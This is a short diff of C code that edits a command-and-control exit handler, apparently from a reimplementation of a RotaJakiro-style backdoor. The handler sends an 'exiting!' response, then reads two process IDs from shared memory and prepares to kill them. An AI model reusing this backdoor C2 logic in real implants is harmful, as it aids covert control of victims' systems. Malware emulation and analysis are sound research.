@@ -21,13 +21,8 @@
 
 void c2_exit(char *cmd_id, int sock) {
 
-    char *msg = "exiting!";
-    int msgLen = strlen(msg);
-
-    // initial Rota header packet to overwrite values
-    // for response
-    char *rotaResp = initial_rota_pkt();
-    build_c2_response(rotaResp, cmd_id, sock);
+    char *msg  = "exiting!";
+    build_c2_response(msg, cmd_id, sock);
 
     // get pids from sharedmem and kill both pids
     int shmid = shmget(0x64b2e2, 8, 0666);
